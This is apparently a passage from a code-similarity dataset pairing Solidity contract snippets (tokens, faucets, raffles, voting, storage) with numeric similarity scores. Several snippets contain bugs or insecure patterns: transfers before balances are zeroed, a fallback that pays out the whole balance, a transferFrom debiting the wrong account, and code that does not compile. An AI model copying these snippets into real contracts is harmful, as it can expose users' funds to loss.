        owner = candidate;
        delete candidate;
    }
}"
"contract UserBasic {
    struct Record {
        bytes32 _id;
        address _addedBy;
        uint _dateAdded;
        bytes32 _transactionHash;
        bytes32 _type;
        bytes32 _hash;
        bytes32 _signature;
    }
    
    mapping(bytes32 => bytes32[]) typeRecords;
    
    mapping(bytes32 => Record) idRecord;
    
    function addRecord(bytes32 _type, bytes32 _id) {
        typeRecords[_type].push(_id);
        var _new = Record(_id, tx.origin, now, """", _type, """", """");
        idRecord[_id] = _new;
    }
}",0.5205677607498262,"contract CAStoreContract is Ownable {

  using SafeMath for uint;



  event DataStored(bytes32 field1, bytes32 field2, bytes32 field3, bytes32 field4);



  function storeData

    (bytes32[] fields1, bytes32[] fields2, bytes32[] fields3, bytes32[] fields4) 

    public onlyOwner {

      for (uint i = 0; i < fields1.length; i++) {

        emit DataStored(fields1[i], fields2[i], fields3[i], fields4[i]);

      }

    }

}"
"contract Guarded {
     ...
     bool locked = false; 

     function withdraw() external {             
         require(!locked, ""Reentrant call detected!"");
         locked = true;

         
         (bool success, ) = msg.sender.call.value(balanceOfPayment1[msg.sender])("""");
         require(success, ""Transfer failed."");
         balanceOfPayment1[msg.sender] = 0;

         
         (bool success, ) = msg.sender.call.value(balanceOfPayment2[msg.sender])("""");
         require(success, ""Transfer failed."");
         balanceOfPayment2[msg.sender] = 0;

         locked = false;
    }
}",0.5598048812366654,"contract AccessList {
    event Added(address _user);
    event Removed(address _user);

    mapping(address => bool) public access;

    function isSet(address addr) external view returns(bool) {
        return access[addr];
    }

    function add() external {
        require(!access[msg.sender]);
        access[msg.sender] = true;
        emit Added(msg.sender);
    }

    function remove() external {
        require(access[msg.sender]);
        access[msg.sender] = false;
        emit Removed(msg.sender);
    }
}"
"contract PrivilegesContract is SuperAdminContract {

    struct Privilege {
        uint Id;
        string Name;
    }

    uint private privilegeId;
    mapping(uint => string) private Privileges;

    function Add(string name) public EnsureSuperAdmin returns (uint) {
        Privileges[privilegeId] = name;
        privilegeId = privilegeId +1;
        return privilegeId;
    }
}",0.5695967512253487,"contract ManagedContractWithPaidService is ManagedContract {

    
    uint public price;

    
    event PriceChanged(
        uint from,
        uint to,
        address indexed by
    );

    
    function changePrice(uint _newPrice) public onlyAdmin returns (bool success){
        emit PriceChanged(price, _newPrice, msg.sender);
        price = _newPrice;
        return true;
    }

}"
"contract second {
    uint calculationResult;
    address public linkedContract;

    function changeContract(address newContract) public {
        linkedContract = newContract;
    }

    function delegatedCalculation(uint firstNumber, uint secondNumber) public {

    }
}",0.5782102500027475,"contract BineuroToken{
  function setCrowdsaleContract (address) public;
  function sendCrowdsaleTokens(address, uint256)  public;
  function burnTokens(address,address, address, uint) public;
  function getOwner()public view returns(address);
}"
"contract Storage {

    struct Block {
        address landlord;
        uint sellPrice;
    }
    Block[101][101] public blocks; 

    function setBlockOwner(uint8 _x, uint8 _y, address _newOwner) external {
        blocks[_x][_y].landlord = _newOwner;
    } 
    function getBlockOwner(uint8 _x, uint8 _y) external view returns (address) {
        return blocks[_x][_y].landlord;
    } 
}",0.5983582394625536,"contract IFulcrum is IERC20 {
    function tokenPrice() external view returns (uint256 price);
    function mint(address receiver, uint256 amount) external returns (uint256 minted);
    function burn(address receiver, uint256 amount) external returns (uint256 burned);
    uint256 public totalAssetBorrow;
}"
"contract MyContract {

    struct Block {
        address landlord;
        uint sellPrice;
    }
    Block[101][101] public blocks; 

    Storage strg;

    function setStorage(address addr) public { strg = Storage(addr); }

    function setNewBlockOwner(uint8 _x, uint8 _y, address _newOwner) public returns (bool) {  
        
        blocks[_x][_y].landlord = _newOwner;        
        return true;
    }

    
    function setBlockOwnerForArea(uint8 fromX, uint8 fromY, uint8 toX, uint8 toY, address _newOwner) {
        for (uint8 ix=fromX; ix<=toX; ix++) {
            for (uint8 iy=fromY; iy<=toY; iy++) {
                setNewBlockOwner(ix, iy, _newOwner);
            }
        }
    }
}",0.5797498432170247,"contract ERC20 {
    uint256 public totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function allowance(address owner, address spender) public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract MyFaucet {
  function () external payable {}

  function requestDrip() public {
    msg.sender.transfer(0.01 * 1000000000000000000);
  }
}",0.5922282030795032,"contract MyGame {

    function() external payable {

        if (address(this).balance > 0 && msg.value == (0))

          msg.sender.transfer(address(this).balance);

        }

}"
"contract SmartMsgData {
    
    event onDeposit(int128 id, address person, uint amount);

    function bytesToBytes16(bytes b, uint offset) private pure returns (bytes16) {
      bytes16 out;

      for (uint i = 0; i < 16; i++) {
        out |= bytes16(b[offset + i] & 0xFF) >> (i * 8);
      }
      return out;
    }

    function () payable external {
        require(msg.value > 0);
        require(msg.data.length == 16); 

        

        int128 id = int128(bytesToBytes16(msg.data, 0));
        address person = msg.sender;
        uint amount = msg.value;

        
        emit onDeposit(id, person, amount);
    }
}",0.5829590354873615,"contract MultiSender is Ownable {

    using SafeMath for uint;



    string public constant NAME = ""MultiSender"";



    event Transfer(address indexed holder, uint amount);

    

    function() public payable {

        

    }

    

    function send(address[] _addresses, uint256[] _values) external {

        require(_addresses.length == _values.length);

        

        uint i;

        uint s;



        for (i = 0; i < _values.length; i++) {

            s += _values[i];

        }

        require(s <= this.balance);



        for (i = 0; i < _addresses.length; i++) {

            _addresses[i].transfer(_values[i]);

            Transfer(_addresses[i], _values[i]);

        }

    }

}"
"contract NewContract {

    struct Location {
        string JSON;
    }

    Location[] locations;

    function createLocation(string memory _json) public {
        locations.push(Location(_json));
    }

    function viewLocation(uint _id) public view returns(string memory) {
        string memory result = locations[_id].JSON;
        return result;
    }
}",0.5516177203800625,"contract ReportStorage is Claimable {
    Report[] public reports;

    struct Report {
        string textReport;
        uint date;
    }

    function counter() public view returns(uint256) {
      return reports.length;
    }
         
    function addNewReport(string newReport) public onlyOwner {
        reports.push(Report(newReport, now));
    }
}"
"contract eth_rate is usingProvable {
  string public ETHUSD;
   event LogConstructorInitiated(string nextStep);
   event LogPriceUpdated(string price);
   event LogNewProvableQuery(string description);

   constructor() public {
       emit LogConstructorInitiated(""Constructor was initiated. Call 'updatePrice()' to send the Provable Query."");
   }

   function __callback(bytes32  myid, string memory result) public {
       if (msg.sender != provable_cbAddress()) revert();
        ETHUSD = result;
        emit LogPriceUpdated(result);
   }

   function updatePrice()public  payable {
       if (provable_getPrice(""URL"") > msg.sender.balance) {
           emit LogNewProvableQuery(""Provable query was NOT sent, please add some ETH to cover for the query fee"");
       } else {
           emit LogNewProvableQuery(""Provable query was sent, standing by for the answer.."");
           provable_query(""URL"", ""json(https:
       }
   }
}",0.5994923233663465,"contract Test is usingOraclize {
    uint public randomNumber;
    mapping(bytes32 => bool) validIds;
    uint constant gasLimitForOraclize = 175000;

    event LogOraclizeQuery(string description);
    event LogResultReceived(uint number);

    function Template() public {
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        oraclize_setCustomGasPrice(10000000000 wei); 
    }

    function getRandomNumber() public payable {
        require(msg.value >= 0.00175 ether);

        bytes32 queryId = oraclize_query(
            ""nested"",
            ""[URL] ['json(https:
            gasLimitForOraclize
        );

        LogOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");

        validIds[queryId] = true;
    }

    function __callback(bytes32 queryId, string result, bytes proof) public {
        require(msg.sender == oraclize_cbAddress());
        require(validIds[queryId]);

        randomNumber = parseInt(result);

        LogResultReceived(randomNumber);

        validIds[queryId] = false;
    }
}"
"contract SimpleEnum {
  enum SomeData {Channel}
  SomeData sd;

  function set_values(uint a) {
    sd.Channel = a
    return sd
  }
}",0.5201162119959586,"contract MyContract {
    function whatDidJasonSay() constant returns (string said){
        return ""ether is a scam"";
    }
}"
"contract Campaign {
    Request[] public requests;
    address  public  manager;
    uint public minimumConstribution;
    mapping(address => bool ) public approvers;
    uint public approversCount;

    constructor(uint minimum) public {
        manager = msg.sender;
        minimumConstribution = minimum;
    }

    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;
    }

    modifier restricted {
        require(msg.sender == manager);
        _;
    }



    function constribute() public payable {
        require(msg.value > minimumConstribution);

        approvers[msg.sender] = true;

        approversCount++;
    }

    function createRequest(string memory description, uint value, address recipient) public restricted {
        Request memory newRequest = Request({
            description : description,
            value : value,
            recipient : recipient,
            complete : false,
            approvalCount : 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {
        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] = true;
        request.approvalCount++;

    }

    function finalizeRequest(uint index) public restricted {
        Request storage request = requests[index];

        require(request.approvalCount > approversCount /2);

        require(!request.complete);

        request.recipient.transfer(request.value);  
   



        request.complete = true;


    }

}",0.5858892945150785,"contract TestToken302 is ERC20 {
        string public constant name=""302TEST TOKEN  COIN"";
        string public constant symbol=""TTK302"";
        uint256 public constant decimals=18;
        uint public  totalSupply=25000 * 10 ** uint256(decimals);

        mapping(address => uint256) balances;
        mapping (address => mapping (address => uint256)) public allowedToSpend;
     

        function TestToken302() public{
                balances[msg.sender]=totalSupply;
        }


        
        function balanceOf(address _owner) public view returns (uint256 balance) {
                return balances[_owner];
        }

        function allowance(address _owner, address _spender) public view returns (uint256){
                return allowedToSpend[_owner][_spender];
        }

        function approve(address _spender, uint256 _value) public returns (bool){
        allowedToSpend[msg.sender][_spender] = _value;
                return true;
        }



        
        function transfer(address _to, uint256 _value) public returns (bool) {
                require(_to != address(0));
                require(_value <= balances[msg.sender]);

                
                balances[msg.sender] -=_value;
                balances[_to] +=_value;
                Transfer(msg.sender, _to, _value);
                return true;
        }


        
        function transferFrom(address _from,address _to, uint256 _value) public returns (bool) {
                require(_to != address(0));
                require(_value <= balances[msg.sender]);
                require(_value <= allowedToSpend[_from][msg.sender]);     
                allowedToSpend[_from][msg.sender] -= _value;
                
                balances[msg.sender] -= _value;
                balances[_to] += _value;
                Transfer(msg.sender, _to, _value);
                return true;
        }





}"
"contract BlipCoinIco is PausableToken {
  *snip*

  function() isIcoOpen payable {
      totalRaised = totalRaised.add(msg.value);

      uint256 tokenAmount = calculateTokenAmount(msg.value);
      balances[fundsWallet] = balances[fundsWallet].sub(tokenAmount);
      balances[msg.sender] = balances[msg.sender].add(tokenAmount);
      Transfer(fundsWallet, msg.sender, tokenAmount);

      
      fundsWallet.transfer(msg.value);
  }

  function calculateTokenAmount(uint256 weiAmount) constant returns(uint256) {
      
      uint256 tokenAmount = weiAmount.mul(50);
      if (now <= startTimestamp + 7 days) {
          
          return tokenAmount.mul(150).div(100);
      } else {
          return tokenAmount;
      }
  }

  *snip*
}",0.5698154815382097,"contract ERC20BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;

  uint256 public totalSupply;



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));



    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public constant returns (uint256 balance) {

    return balances[_owner];

  }



  function totalSupply() constant returns (uint256 _totalSupply) {

    return totalSupply;

  }



}"
"contract ClearMapping {
    mapping(uint => bool)[] state;

    
    
    
    function add() returns (bool) {
        uint pos = state.length++;
        bool curr = state[pos][0];
        state[pos][0] = true;
        return curr;
    }

    function remove() {
        state.length--;
    }
}",0.5982371508427555,"contract ERC20 {

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

}"
"contract Patients {
    uint256 public count = 0;
    struct Patient {
        bytes16 patientID;
        bytes16 title;
        bytes16 fullName;
        bytes16 dob;
        bytes16 gender;
        bytes16 contact;
        bytes16 residentialAddress;
        bytes16 relativeNumber;
        uint256 NHIS;
        uint256 temperature;
        uint256 bloodPressure;
        uint256 pulse;
        uint256 respiration;
        uint256 weight;
        uint256 bmi;
        bool appointment;
    }

event created(string message);

mapping(uint256 => Patient) public patient;

  function setBio(bytes16  patientID, bytes16  title, bytes16  fullName, bytes16  dob, bytes16  gender, bytes16  contact, bytes16  residentialAddress, bytes16  relativeNumber, uint256 NHIS) public {
    count++;
    patient[count].patientID = patientID;
    patient[count].title = title;
    patient[count].fullName = fullName;
    patient[count].dob = dob;
    patient[count].gender = gender;
    patient[count].contact = contact;
    patient[count].residentialAddress = residentialAddress;
    patient[count].relativeNumber = relativeNumber;
    patient[count].NHIS = NHIS;
    emit created('New Patient folder created');
  }

  function getBio(uint256 index) public view returns(bytes16  patientID, bytes16  title, bytes16  fullName, bytes16  dob,bytes16  gender, bytes16  contact, bytes16  residentialAddress,bytes16  relativeNumber, uint256 NHIS){
    Patient memory p = patient[index];
    return(p.patientID, p.title, p.fullName, p.dob, p.gender, p.contact, p.residentialAddress, p.relativeNumber, p.NHIS);
  }

  function setVitalSigns(uint _id, uint256 temperature, uint256 bloodPressure, uint256 pulse, uint256 respiration, uint256 weight, uint256 bmi, bool)public {
    Patient memory _patient = patient[_id];
    _patient.temperature = temperature;
    _patient.bloodPressure = bloodPressure;
    _patient.pulse = pulse;
    _patient.respiration = respiration;
    _patient.weight = weight;
    _patient.bmi = bmi;
    _patient.appointment = !_patient.appointment;
    emit created('Vital Signs Checked');
  }
  
}",0.5431192750753521,"contract NumeraireShared is Safe {

    address public numerai = this;

    
    uint256 public supply_cap = 21000000e18; 
    uint256 public weekly_disbursement = 96153846153846153846153;

    uint256 public initial_disbursement;
    uint256 public deploy_time;

    uint256 public total_minted;

    
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping (uint => Tournament) public tournaments;  

    struct Tournament {
        uint256 creationTime;
        uint256[] roundIDs;
        mapping (uint256 => Round) rounds;  
    } 

    struct Round {
        uint256 creationTime;
        uint256 endTime;
        uint256 resolutionTime;
        mapping (address => mapping (bytes32 => Stake)) stakes;  
    }

    
    
    
    
    struct Stake {
        uint128 amount; 
        uint128 confidence;
        bool successful;
        bool resolved;
    }

    
    event Mint(uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Staked(address indexed staker, bytes32 tag, uint256 totalAmountStaked, uint256 confidence, uint256 indexed tournamentID, uint256 indexed roundID);
    event RoundCreated(uint256 indexed tournamentID, uint256 indexed roundID, uint256 endTime, uint256 resolutionTime);
    event TournamentCreated(uint256 indexed tournamentID);
    event StakeDestroyed(uint256 indexed tournamentID, uint256 indexed roundID, address indexed stakerAddress, bytes32 tag);
    event StakeReleased(uint256 indexed tournamentID, uint256 indexed roundID, address indexed stakerAddress, bytes32 tag, uint256 etherReward);

    
    
    function getMintable() constant returns (uint256) {
        return
            safeSubtract(
                safeAdd(initial_disbursement,
                    safeMultiply(weekly_disbursement,
                        safeSubtract(block.timestamp, deploy_time))
                    / 1 weeks),
                total_minted);
    }
}"
"contract CustomerTemplate {

    bytes32 public customerName;
    bytes32 public customerLoc;

    function CustomerTemplate (bytes32 _customerName, bytes32 _customerLoc)  {

        customerName    = _customerName;
        customerLoc     = _customerLoc;

    }

}",0.5092270487549291,"contract Contract {

    bytes32 public Name;



    

    

    constructor(bytes32 _contractName) public {

        Name = _contractName;

    }



    function() public payable { }

    

    function sendFunds(address receiver, uint amount) public {

        receiver.transfer(amount);

    }    

}"
"contract ReentrancyGuard {
    using SafeMath for uint256;
    uint256 private _guardCounter;

    constructor () internal {
        _guardCounter = 1;
    }

    modifier nonReentrant() {
        _guardCounter = _guardCounter.add(1);
        uint256 localCounter = _guardCounter;
        _;
        require(localCounter == _guardCounter);
    }
}",0.505312544617485,"contract owned {

        address payable public owner;

    	using SafeMath for uint256;

    	

        constructor() public {

            owner = msg.sender;

        }

    

        modifier onlyOwner {

            require(msg.sender == owner);

            _;

        }

    

        function transferOwnership(address payable newOwner) onlyOwner public {

            owner = newOwner;

        }

    }"
"contract ReferenceConsumer {
  AggregatorInterface internal ref;

  constructor(address _aggregator) public {
    ref = AggregatorInterface(_aggregator);
  }

  function getLatestAnswer() public returns (int256) {
    return ref.latestAnswer();
  }
}",0.5629802437043773,"contract Lobster {

    address private owner;
    string private flag;
    
    constructor () public {
        owner = msg.sender;
    }
    
    function getFlag() public view returns (string memory) {
        require(msg.sender == owner);
        return flag;
    }
    
}"
"contract AuthorDonationExample {



  
  address payable author;
  address payable eachditor;

  
  

  function donate() public payable {
    
    require (msg.value != 0);

    
    
    uint editorAmount = msg.value / 5;
    uint authorAmount = msg.value - editorAmount;

    
    
    require (author.send(authorAmount)) ;
    require (editor.send(editorAmount)) ;
  }
}",0.5881142174574864,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract LocalEthereum {

    address public owner;
    event Created(bytes32 _tradeHash);
    function createEvent() onlyOwner external {
        Created(0x01);
    } 
}",0.5868678720883452,"contract Ownable {

  address public owner;

  
  function Ownable() internal {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}"
"contract MyContract {
struct Posposal{
    uint posposalId;
    address voteSponsorAddr;

    bytes1 description_;
    uint userId;
    uint amount;
}
Posposal[] public curPosposals; 
uint public posposalNextId=0;

function MyContract() {

}
uint public expId;
address public expTarget;
uint public expAmount;
function issuse(uint userId,address target_,uint amount_)  {
    
    expId=userId;
    expAmount=amount_;
    expTarget=target_;
    curPosposals.push(Posposal(posposalNextId,msg.sender,0x01,userId,amount_));
    posposalNextId++;
}}",0.5676018156602012,"contract IERC20AuctionOpProxy {
  function add_auction(address _auction) public;
  function apply_bid(address addr, uint amount, uint price, uint price_unit) public;
  function revoke_bid(address addr, uint amount, uint price, uint price_unit) public;
  function apply_auction(address addr, uint amount, uint price, uint price_unit) public;
  function object_token() public view returns(address, string memory);
  function object_total_amount() public view returns(uint);
}"
"contract ElephanteumCore is Ownable {

        ElephanteumStorage public eStorage;

        function ElephanteumCore(address _eStorage) public payable {
            eStorage = ElephanteumStorage(_eStorage);     
        }

        function init(bytes32 _name, bytes32 _symbol, uint _supply) public onlyOwner {
            eStorage.setTotalSupply(_supply);
            eStorage.setElephantsRemainingToAssign(_supply);
            eStorage.setName(_name);
            eStorage.setSymbol(_symbol);
        }
}",0.5078122084809183,"contract ProsperPresaleToken is UpgradeableToken {
    
    
    string public name;
    string public symbol;
    uint8 public decimals;

  
    function ProsperPresaleToken(address _owner, string _name, string _symbol, uint256 _initSupply, uint8 _decimals) UpgradeableToken(_owner) {
        
        name = _name;
        symbol = _symbol;
        totalSupply = _initSupply;
        decimals = _decimals;
        
        balances[_owner] = _initSupply;
        
    }
    
}"
"contract ElephanteumStorage is Ownable {

        bytes32 public name;
        bytes32 public symbol;

        uint public totalSupply;

        uint public elephantsRemainingToAssign;

        function setName(bytes32 _name) onlyOwner external {
            name = _name;
        }

        function setSymbol(bytes32 _symbol) onlyOwner external {
            symbol = _symbol;
        }

        function setTotalSupply(uint _totalSupply) onlyOwner external {
            totalSupply = _totalSupply;
        }

        function setElephantsRemainingToAssign(uint _elephantsRemainingToAssign) onlyOwner external {
            elephantsRemainingToAssign = _elephantsRemainingToAssign;
        } 
}",0.5984310263628286,"contract DroneToken is BurnableToken {

     string public name ;

     string public symbol ;

     uint8 public decimals = 0 ;

     

     

     function ()public payable {

         revert();

     }

     

     

     function DroneToken(

            uint256 initialSupply,

            string tokenName,

            string tokenSymbol

         ) public {

         totalSupply = initialSupply.mul( 10 ** uint256(decimals)); 

         name = tokenName;

         symbol = tokenSymbol;

         balances[msg.sender] = totalSupply;

         

         

         emit Transfer(address(0), msg.sender, totalSupply);

     }

     

     

    function getTokenDetail() public view returns (string, string, uint256) {

	    return (name, symbol, totalSupply);

    }

 }"
"contract B is A {

  function doSomethingB() {
    
  }

}",0.5902464026069155,"contract PotLike {
    function drip() external;
}"
"contract Contract2{

        assembly
        {
                let success := call(
                    gas,           
                    dest,          
                    0,             
                    add(data, 32), 
                    mload(data),   
                    ret,           
                    8              
                )
                if iszero(success) {
                    revert(0, 0)
                }
        }

}",0.5065960856484084,"contract ERC23 is ERC20{
    function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool success);
}"
"contract TripHistory {
       struct Trip {
           string lat;
           string lon;
       }
        mapping(string => Trip[]) trips;

        function getTrip(string _trip_id) public view returns (Trip[]) {
            return trips[_trip_id];
        }
        function storeTrip(string _trip_id, string _lat, string _lon) public  {
           trips[_trip_id].push(Trip(_lat, _lon));
        }

}",0.5551031574207047,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract Tasks {

    struct Person { 
        uint weight; 
        bool deedCompleted;  
        address delegate; 
        uint deed;   
    }

    struct Proposal {
        bytes32 deedName;   
        uint karmaPoints;
    }

    address public chairperson;

    mapping(address => Person) public validators;

    Proposal[] public proposals;

    
    function Ballot(bytes32[] proposalNames) public {
        chairperson = msg.sender;
        validators[chairperson].weight = 1;

        
        
        
        for (uint i = 0; i < proposalNames.length; i++) {
            
            
            
            proposals.push(Proposal({
                deedName: proposalNames[i],
                karmaPoints: 0
            }));
        }
    }

    
    
    function giveRightToVote(address validator) public {
        require(
            msg.sender == chairperson,
            ""Only chairperson can give right to deed.""
        );
        require(
            !validators[validator].deedCompleted,
            ""The validator already confirm deed was completed.""
        );
        require(validators[validator].weight == 0);
        validators[validator].weight = 1;
    }

    
    function delegate(address to) public {
        Person storage sender = validators[msg.sender];
        require(!sender.deedCompleted, ""You already completed a deed."");

        require(to != msg.sender, ""Self-delegation is disallowed."");

        while (validators[to].delegate != address(0)) {
            to = validators[to].delegate;

            require(to != msg.sender, ""Found loop in delegation."");
        }

        sender.deedCompleted = true;
        sender.delegate = to;
        Person storage delegate_ = validators[to];
        if (delegate_.deedCompleted) {
            
            
            proposals[delegate_.deed].karmaPoints += sender.weight;
        } else {
            
            
            delegate_.weight += sender.weight;
        }
    }

    
    function deed(uint proposal) public {
        Person storage sender = validators[msg.sender];
        require(!sender.deedCompleted, ""Already deedCompleted."");
        sender.deedCompleted = true;
        sender.deed = proposal;

        
        
        
        proposals[proposal].karmaPoints += sender.weight;
    }

    
    
    function completedProposal() public view
            returns (uint completedProposal_)
    {
        uint completedVoteCount = 0;
        for (uint p = 0; p < proposals.length; p++) {
            if (proposals[p].karmaPoints > completedVoteCount) {
                completedVoteCount = proposals[p].karmaPoints;
                completedProposal_ = p;
            }
        }
    }

    
    
    
    function winnerName() public view
            returns (bytes32 winnerName_)
    {
        winnerName_ = proposals[completedProposal()].deedName;
    }
}",0.5805084566298434,"contract Raffle
{
	struct Player
	{
		address delegate;
		uint amount;
		uint previousTotal;
	}
	
	address owner;
	Player[] players;
	address[] previousWinners;
	mapping(address => uint) playerTotalAmounts;
	uint total = 0;
	uint seed = 0;
	uint lastSeed = 0;
	bool selfdestructQueued = false;
	
	function Raffle() public
	{
		owner = msg.sender;
	}
	
	
	function() public
	{
		assert(false);
	}
	
	function kill() public
	{
		require(msg.sender == owner);
		if (players.length > 0)
		{
			selfdestructQueued = true;
		}
		else
		{
			selfdestruct(owner);
		}
	}
	
	function enter(uint userSeed) public payable
	{
		require(msg.value > 0);
		require(userSeed != 0);
		players.push(Player(msg.sender, msg.value, total));
		playerTotalAmounts[msg.sender] += msg.value;
		total += msg.value;
		if (lastSeed != userSeed)
		{
			lastSeed = userSeed;
			seed ^= userSeed;
		}
	}
	
	function totalPool() public view returns (uint)
	{
		return total;
	}
	
	function enteredTotalAmount() public view returns (uint)
	{
		return playerTotalAmounts[msg.sender];
	}
	
	function getPreviousWinners() public view returns (address[])
	{
		return previousWinners;
	}
	
	function selectWinner() public
	{
		require(msg.sender == owner);
		address winner = 0x0;
		if (players.length > 0)
		{
			uint value = seed % total;
			uint i = 0;
			uint rangeStart = 0;
			uint rangeEnd = 0;
			
			uint min = 0;
			uint max = players.length - 1;
			uint current = min + (max - min) / 2;
			while (true)
			{
				rangeStart = players[current].previousTotal;
				rangeEnd = rangeStart + players[current].amount;
				if (value >= rangeStart && value < rangeEnd)
				{
					winner = players[current].delegate;
					break;
				}
				if (value < rangeStart)
				{
					max = current - 1;
					current = min + (max - min) / 2;
				}
				else if (value >= rangeEnd)
				{
					min = current + 1;
					current = min + (max - min) / 2;
				}
			}
			require(winner != 0x0);
			uint prize = total * 99 / 100; 
			uint fee = total - prize;
			for (i = 0; i < players.length; ++i)
			{
				playerTotalAmounts[players[i].delegate] = 0;
			}
			players.length = 0;
			total = 0;
			winner.transfer(prize);
			owner.transfer(fee);
			previousWinners.push(winner);
		}
		if (selfdestructQueued)
		{
			selfdestruct(owner);
		}
	}
	
}"
"contract Faucet {

    
    function withdraw(uint withdraw_amount) public {

        
        require(withdraw_amount <= 100000000000000000);

        
        msg.sender.transfer(withdraw_amount);

    }

    
    function () payable external {} 
}",0.5754050609876619,"contract IEmPool {
   function deposit() public payable;
   function withdraw(uint256 _value) external;
   function withdrawTo(address _to, uint256 _value) public;
}"
"contract EthUpVoting {

  struct Question {
    bytes32 ipfsHash;
    uint upvotes;
    address user;
  }

  uint private questionId;
  mapping (uint => Question) public questionList;

  event AddedQuestion(bytes32 ipfs_hash, uint qId);

  function EthUpVoting() public {
    questionId = 1;
    questionList[questionId] = Question({
        ipfsHash: ""Hello, World!"",
        upvotes: 0,
        user: msg.sender
    });
  }

  function addNewQuestion(bytes32 questionHash) public {
      questionId += 1;
      questionList[questionId] = Question({
          ipfsHash: questionHash,
          upvotes: 0,
          user: msg.sender
      });
      AddedQuestion(questionHash, questionId);
  }

  function voteForQuestion(uint qId) public {    
    questionList[qId].upvotes += 1;
    questionId += 1;
  }

  function getQuestionTextAtIndex(uint qId) public constant returns (bytes32 ipfsHashReturn) {
      return questionList[qId].ipfsHash;
  }

   function getQuestionListSize() public constant returns (uint size) {
      return questionId;
  }

}",0.5481039682071563,"contract ProofOfExistence {

    address public owner;

    mapping (bytes32 => uint256) public documents;

    modifier requireOwner() {
        require(msg.sender == owner, ""Owner is required."");
        _;
    }

    modifier requireNoHashExists(bytes32 hashedDocument) {
        require(documents[hashedDocument] == 0, ""Hash value already exists."");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function addDocument(bytes32 hashedDocument)
        public requireOwner requireNoHashExists(hashedDocument) returns (bytes32) {

        documents[hashedDocument] = block.number;

        return hashedDocument;
    }

    function doesHashExist(bytes32 documentHash) public view returns (bool) {
        return documents[documentHash] != 0;
    }

    function getBlockNumber(bytes32 documentHash) public view returns (uint256) {
        return documents[documentHash];
    }

    function () external {
        revert(""Invalid data sent to contract."");
    }

    function selfDestroy() public requireOwner {
        selfdestruct(msg.sender);
    }
}"
"contract Fund {
    
    mapping(address => uint) shares;
    
    function withdraw() {
        var share = shares[msg.sender];
        shares[msg.sender] = 0;
        msg.sender.transfer(share);
    }
}",0.5773256156667645,"contract WithdrawalContract is owned {

    function withdraw() public onlyOwner {
        uint amount = address(this).balance;
        msg.sender.transfer(amount);
    }
}"
"contract B {
    A private a;

    function func1() external {
        var (x, y, z, w) = a.getVars();
        
    }

    function func2() external {
        var (x, y, z, w) = a.getVars();
        
    }
}",0.5503092542231288,"contract Sqrt {

	function sqrt(uint x)public pure returns(uint y) {

        uint z = (x + 1) / 2;

        y = x;

        while (z < y) {

            y = z;

            z = (x / z + z) / 2;

        }

    }

}"
"contract C1 {

    event Sig(bytes4 sig);
    C2 c2;

    constructor(address c2Addr)public {
        c2 = C2(c2Addr);
    }

    function func1()public {
        bytes4 sigFromC2Func2 = c2.func2();
        emit Sig(sigFromC2Func2);
        bytes4 sigFromThisFunc2 = func2();
        emit Sig(sigFromThisFunc2);
    }

    function func2() pure private returns(bytes4) {
        return msg.sig;
    }
}",0.5365340242736988,"contract ENSReverseRegistrar {
    function claim(address _owner) public returns (bytes32);
    function claimWithResolver(address _owner, address _resolver) public returns (bytes32);
    function setName(string memory _name) public returns (bytes32);
    function node(address _addr) public pure returns (bytes32);
}"
"contract SimpleSmartAsset is Mortal {

  uint usagePrice;
  Beneficiary[] beneficiaries;
  uint totalWeight; 

  event AssetCreated(uint _usagePrice,
                     address[] addresses,
                     uint[] weights);

  function SimpleSmartAsset(uint _usagePrice,
                            address[] addresses,
                            uint[] weights) {
    owner = msg.sender;
    usagePrice = _usagePrice;

    uint beneficiaryCount = addresses.length;
    for (uint i = 0; i < beneficiaryCount; i++) {

      uint weight = weights[i];

      addBeneficiary(addresses[i], weight);
      totalWeight += weight;
    }

    AssetCreated(_usagePrice, addresses, weights);
  }

  function getUsagePrice() constant returns (uint) {
    return usagePrice;
  }

  event BeneficiaryPaid(address addr, uint amount);

  function pay() payable onlyOwner {
    require(msg.value >= usagePrice);

    uint beneficiaryCount = beneficiaries.length;
    for (uint i = 0; i < beneficiaryCount; i++) {

      Beneficiary memory beneficiary = beneficiaries[i];

      uint weight = beneficiary.weight;
      address addr = beneficiary.addr;

      uint amount = (weight * usagePrice) / totalWeight;

      addr.transfer(amount);
      BeneficiaryPaid(addr, amount);
    }
  }

  struct Beneficiary {
    address addr;
    uint weight;
  }

  function addBeneficiary(address addr, uint weight) onlyOwner {
    beneficiaries.push(Beneficiary({
        addr: addr,
        weight: weight
    }));
  }

